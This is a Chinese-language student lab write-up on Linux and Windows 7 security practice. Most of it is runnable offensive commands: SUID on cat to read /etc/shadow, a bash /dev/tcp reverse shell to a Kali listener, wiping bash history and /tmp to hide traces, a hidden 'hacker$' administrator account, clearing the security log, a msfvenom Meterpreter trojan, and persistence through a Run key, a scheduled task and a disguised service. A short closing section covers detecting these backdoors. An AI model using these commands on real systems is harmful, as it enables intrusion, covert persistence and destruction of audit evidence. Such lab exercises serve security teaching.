---
title: "Linux与Windows安全攻防基础实战：权限管控、反弹Shell与持久化后门"
published: 2025-01-01
description: "涵盖Linux用户组权限管控、SUID提权、NC反弹Shell、Windows日志分析与多种持久化后门搭建的完整安全攻防实训。"
tags: ["Linux", "Windows", "反弹Shell", "持久化", "权限管控", "日志分析", "安全"]
category: "大三下实训"
---

前置操作：

CentOS 关闭防火墙、放行端口

systemctl stop firewalld

systemctl disable firewalld

setenforce 0

sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config

![图片](./images/jr4_612_img1.png)

Kali 放行监听端口，更新工具

cp /etc/apt/sources.list /etc/apt/sources.list.bak

cat > /etc/apt/sources.list << EOF

# Kali Rolling 官方主源

deb http://http.kali.org/kali kali-rolling main non-free contrib

deb-src http://http.kali.org/kali kali-rolling main non-free contrib

EOF

apt update && apt upgrade -y

apt install ufw -y

ufw allow 2233/tcp

ufw enable

ufw status

![图片](./images/jr4_612_img2.png)

Win7

一、权限前置：关闭 UAC 用户账户控制（否则 MSF、后门命令执行会拦截）

打开「控制面板 → 用户账户 → 用户账户 → 更改用户账户控制设置」

滑块拉到最底部 从不通知，点击确定

重启 Win7 生效

![图片](./images/jr4_612_img3.png)

二、网络前置：关闭防火墙 + 放行反弹流量（Kali 与 Win7 同网段互通）

图形界面操作

控制面板 → 系统和安全 → Windows 防火墙

左侧「打开或关闭 Windows 防火墙」

专用网络、公用网络全部选择 关闭 Windows 防火墙，确定

![图片](./images/jr4_612_img4.png)

验证互通（Win7 CMD 执行）

ping Kali的IP

![图片](./images/jr4_612_img5.png)

三、系统功能前置：开启日志完整记录、取消日志自动覆盖

Win+R 输入 eventvwr.msc 打开事件查看器

左侧「Windows 日志 → 安全」右键 → 属性

日志最大大小建议设为 81920KB，勾选 按需要覆盖事件，取消 “清除日志前备份”（实验方便清空日志抓 1102 事件）

同理设置「应用程序」「系统」日志属性，保证能捕获 4624/4720/1102 等审计事件。

![图片](./images/jr4_612_img6.png)

1、Linux用户/组&Sudo权限管控  操作主机：CentOS 7

创建普通用户 op_user，附属组添加至 wheel 组；

useradd -G wheel op_user

passwd op_user

id op_user

![图片](./images/jr4_612_img7.png)

通过visudo配置规则：仅允许 op_user 执行 systemctl 命令；

visudo

找到 root ALL=(ALL) ALL 行；

在文件末尾新增规则：

op_user    ALL=(ALL)       /usr/bin/systemctl

保存退出ESC → :wq

![图片](./images/jr4_612_img8.png)

切换至 op_user 验证权限，测试执行 useradd 验证权限拦截；

su - op_user

sudo systemctl status sshd

sudo useradd test123

![图片](./images/jr4_612_img9.png)

查看 /etc/passwd，找出系统内 UID=0 的特权用户。

awk -F: '$3==0 {print $0}' /etc/passwd

cat /etc/passwd

![图片](./images/jr4_612_img10.png)

2、Linux文件权限&SUID特殊权限  操作主机：CentOS 7

给/tmp/sec_work/log_test.txt设置权限：属主 7、属组 4、其他 0，写出数字权限命令；

mkdir -p /tmp/sec_work

touch /tmp/sec_work/log_test.txt

chmod 740 /tmp/sec_work/log_test.txt

ls -l /tmp/sec_work/log_test.txt

![图片](./images/jr4_612_img11.png)

切换其他普通用户访问文件，验证权限控制效果；

sudo useradd test_user

sudo passwd test_user

su - test_user

cat /tmp/sec_work/log_test.txt

![图片](./images/jr4_612_img12.png)

为/usr/bin/cat添加 SUID 权限，普通用户执行cat /etc/shadow验证提权；

su – root

chmod 4755 /usr/bin/cat

ls -l /usr/bin/cat

su - test_user

cat /etc/shadow

![图片](./images/jr4_612_img13.png)

移除SUID权限，恢复系统默认状态。

su - root

chmod 0755 /usr/bin/cat

ls -l /usr/bin/cat

su - test_user

cat /etc/shadow

![图片](./images/jr4_612_img14.png)

3、NC反弹Shell基础攻防  操作主机：Kali（监听端）、CentOS（被控反弹端）

Kali 使用 nc -lvnp 2233 监听 2233 端口；

nc -lvnp 2233

![图片](./images/jr4_612_img15.png)

CentOS 执行标准反弹 Shell 命令，连接 Kali 监听端口；

bash -i >& /dev/tcp/192.168.1.100/2233 0>&1

![图片](./images/jr4_612_img16.png)

![图片](./images/jr4_612_img17.png)

在反弹会话中执行 ip addr、whoami、df -h 验证权限；

ip addr

whoami

df -h

![图片](./images/jr4_612_img18.png)

![图片](./images/jr4_612_img19.png)

断开连接，清除操作痕迹。

断开会话：kali输入 exit 关闭反弹连接；

CentOS 清除历史命令，消除反弹记录：

history -c

> ~/.bash_history

rm -rf /tmp/*

![图片](./images/jr4_612_img20.png)

![图片](./images/jr4_612_img21.png)

4、Windows系统日志深度分析  操作主机：Windows 7

运行 eventvwr.msc 打开事件查看器，定位安全日志；

![图片](./images/jr4_612_img22.png)

筛选查看：4624(登录成功)、4625(登录失败)，记录登录类型、源 IP、用户名；

![图片](./images/jr4_612_img23.png)

执行命令创建隐藏后门账户 hacker$，并加入本地管理员组，记录完整命令；

net user hacker$ 123456 /add

net localgroup administrators hacker$ /add

net user

![图片](./images/jr4_612_img24.png)

在安全日志中找到 4720 (创建用户)、4732(添加管理员组) 事件，截取日志详情；

4720：

![图片](./images/jr4_612_img25.png)

4732：

![图片](./images/jr4_612_img26.png)

模拟手动清空安全日志，找到 1102(审计日志已清除) 事件并截图；

![图片](./images/jr4_612_img27.png)

查看系统应用程序日志、系统日志，简述两类日志作用。

应用程序日志：记录第三方软件、安装程序、桌面软件、业务程序的启动、崩溃、报错、异常操作；软件运行故障优先查看此日志。

系统日志：记录 Windows7 系统内核、硬件驱动、系统服务、开机关机、系统组件加载、硬件异常报错；蓝屏、服务启动失败、硬件识别异常查看该日志。

5、Windows多种持久化后门搭建&防御  攻击机：Kali；被控靶机：Windows 7

使用MSF制作Windows 反弹木马，实现远程控制

生成 32 位兼容 Win7 Meterpreter 木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.214.138 lport=2233 -f exe -o win7_backdoor.exe

![图片](./images/jr4_612_img28.png)

启动 MSF 监听程序等待反弹连接

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.214.138

set LPORT 2233

run

将 win7_backdoor.exe 传入 Win7 虚拟机，双击运行，Kali 自动获取 Meterpreter 会话；

![图片](./images/jr4_612_img29.png)

基于已获取的Meterpreter权限，完成3种Windows持久化方案，每种方案需验证重启后依然维持连接，分步操作+截图留存。

Windows注册表自启持久化

上传后门程序到 Win7 系统临时目录

upload /root/win7_backdoor.exe C:\\Windows\\Temp\\sysupdate.exe

写入当前用户开机自启注册表项

reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SysUpdateService -d C:\\Windows\\Temp\\sysupdate.exe

![图片](./images/jr4_612_img30.png)

验证持久化效果

Win7 虚拟机执行重启操作；

Kali 保持 handler 监听，Win7 开机登录桌面后自动回弹 Meterpreter 会话；

![图片](./images/jr4_612_img31.png)

系统计划任务持久化

execute -f cmd.exe -a "/c schtasks /create /tn AutoSysLog /tr C:\Windows\Temp\sysupdate.exe /sc onlogon /ru System /f"

![图片](./images/jr4_612_img35.png)

Windows服务持久化

execute -f cmd.exe -a "/c sc create WinGuard binPath=C:\Windows\Temp\sysupdate.exe type=own start=auto"

execute -f cmd.exe -a "/c sc config WinGuard start=auto"

execute -f cmd.exe -a "/c net start WinGuard"

![图片](./images/jr4_612_img32.png)

附加题：排查开机自启项、注册表Run项、计划任务、系统服务，找出所有恶意后门

思路：任务管理器开机自动运行的程序、路径非常规等

开机自启程序（任务管理器）

Win7 快捷键 Ctrl+Shift+Esc 打开任务管理器 → 切换「启动」标签，查看非系统陌生程序、路径在 Temp / 下载目录的程序。

注册表 Run 启动项排查

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

![图片](./images/jr4_612_img33.png)

全部计划任务排查

schtasks /query /v

系统服务全量排查

sc queryex state=all

临时目录后门文件排查

dir C:\Windows\Temp\*.exe

dir C:\Users\Public\*.exe

![图片](./images/jr4_612_img34.png)
